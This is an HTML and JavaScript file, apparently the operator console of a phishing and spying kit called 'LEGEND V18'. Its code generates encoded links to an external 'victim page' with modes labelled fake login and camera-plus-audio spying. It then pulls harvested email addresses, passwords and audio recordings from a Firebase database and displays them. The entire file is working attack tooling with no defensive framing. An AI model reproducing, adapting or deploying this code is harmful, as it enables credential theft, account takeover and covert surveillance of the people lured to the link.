<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEGEND CONSOLE V18</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; padding: 15px; margin: 0; }
        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 10px; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 5px; color: white; }
        .log-card { background: #fff; padding: 15px; border-radius: 10px; margin-top: 10px; border-left: 5px solid #f00; font-size: 0.8rem; }
        audio { width: 100%; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#f00; text-align:center;">LEGEND V18 CONSOLE</h2>
        <input type="text" id="masterKey" placeholder="Secret Key" style="width:100%; padding:10px; margin-bottom:10px; border-radius:5px; border:1px solid #ddd;">
        <input type="text" id="targetUrl" placeholder="Target Link" style="width:100%; padding:10px; margin-bottom:10px; border-radius:5px; border:1px solid #ddd;">
        
        <select id="mode" style="width:100%; padding:10px; margin-bottom:10px;">
            <option value="1">Mode 1: Fake Login (Phishing)</option>
            <option value="2">Mode 2: Spy (Cam + Audio)</option>
        </select>
        
        <button class="btn" style="background:#00a884;" onclick="generateLink()">GENERATE MASTER LINK</button>
        <p id="resLink" style="word-break:break-all; font-size:0.7rem; color:blue;"></p>
    </div>

    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px;">
        <button class="btn" style="background:#333;" onclick="fetchData('logins')">LOGINS</button>
        <button class="btn" style="background:#cc0000;" onclick="fetchData('audio')">VOICES</button>
    </div>

    <div id="displayArea"></div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
        const VICTIM_PAGE = "https://video-obtg.vercel.app/";

        function generateLink() {
            const k = document.getElementById('masterKey').value;
            const r = document.getElementById('targetUrl').value;
            const m = document.getElementById('mode').value;
            const link = `${VICTIM_PAGE}?id=${btoa(JSON.stringify({k, r, m}))}`;
            document.getElementById('resLink').innerText = link;
        }

        async function fetchData(path) {
            const key = document.getElementById('masterKey').value;
            const res = await fetch(`${DB_URL}${path}/${key}.json`);
            const data = await res.json();
            const area = document.getElementById('displayArea');
            area.innerHTML = "";
            if(!data) return;

            Object.keys(data).reverse().forEach(id => {
                const item = data[id];
                if(path === 'logins') {
                    area.innerHTML += `<div class="log-card">ðŸ•’ ${item.time}<br>ðŸ‘¤ <b>Email:</b> ${item.email}<br>ðŸ”‘ <b>Pass:</b> ${item.pass}</div>`;
                } else {
                    area.innerHTML += `<div class="log-card">ðŸ•’ ${item.time}<br><audio controls src="${item.audio}"></audio></div>`;
                }
            });
        }
    </script>
</body>
</html>
